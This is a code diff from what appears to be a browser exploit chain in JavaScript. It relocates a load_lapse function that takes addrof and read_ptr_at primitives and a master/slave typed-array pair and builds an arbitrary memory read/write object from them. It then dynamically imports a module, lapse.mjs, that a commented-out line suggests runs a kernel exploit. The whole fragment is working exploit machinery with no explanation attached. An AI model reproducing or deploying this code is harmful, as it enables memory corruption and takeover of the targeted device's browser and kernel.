@@ -427,6 +427,43 @@ var expl_slave = new DataView(shared_buf);
     m[7] = 1;
 
 
+async function load_lapse() {
+  const { Memory } = await import('./module/mem.mjs');
+  const { Int: Int64 } = await import('./module/int64.mjs');
+
+  const obj = { addr: null, 0: 0 };
+
+  
+  const rawPtr = window.addrof(obj);
+//  alert("rawPtr = 0x" + rawPtr.toString(16));
+
+  const btRaw = window.read_ptr_at(rawPtr + 8);
+ // alert("butterfly raw = 0x" + btRaw.toString(16));
+
+
+  const obj_p = new Int64(rawPtr >>> 0, (rawPtr / 0x100000000) >>> 0);
+  const obj_bt = new Int64(btRaw  >>> 0, (btRaw  / 0x100000000) >>> 0);
+
+  const off0x10 = new Int64(0x10, 0);
+// const master_b = new Uint32Array(new ArrayBuffer(1));  
+ // const slave_b  = new DataView   (new ArrayBuffer(1)); 
+  new Memory(
+    expl_master,
+    expl_slave,
+    obj,
+    obj_p.add(off0x10),
+    obj_bt
+  );
+
+ 
+  import('./lapse.mjs');
+ 
+}
+
+
+      load_lapse();
+     return;
+	
 /*async function load_lapse(){
 	   
         let mod = await import('./module/mem.mjs');
@@ -632,45 +669,7 @@ new Memory(master_b, slave_b, obj, obj_p.add(0x10), obj_bt);
 	*/
 
 
-async function load_lapse() {
-  const { Memory } = await import('./module/mem.mjs');
-  const { Int: Int64 } = await import('./module/int64.mjs');
 
-  const obj = { addr: null, 0: 0 };
-
-  
-  const rawPtr = window.addrof(obj);
-//  alert("rawPtr = 0x" + rawPtr.toString(16));
-
-  const btRaw = window.read_ptr_at(rawPtr + 8);
- // alert("butterfly raw = 0x" + btRaw.toString(16));
-
-
-  const obj_p = new Int64(rawPtr >>> 0, (rawPtr / 0x100000000) >>> 0);
-  const obj_bt = new Int64(btRaw  >>> 0, (btRaw  / 0x100000000) >>> 0);
-
-  const off0x10 = new Int64(0x10, 0);
-// const master_b = new Uint32Array(new ArrayBuffer(1));  
- // const slave_b  = new DataView   (new ArrayBuffer(1)); 
-  new Memory(
-    expl_master,
-    expl_slave,
-    obj,
-    obj_p.add(off0x10),
-    obj_bt
-  );
-
-// import { kexploit } from './lapse.mjs';
-// await kexploit();
-  // import('./lapse.mjs');
-	//await import('./lapse.mjs');
-  import('./lapse.mjs');
- 
-}
-
-
-      load_lapse();
-    //return;
 	
     //run_hax();
 }
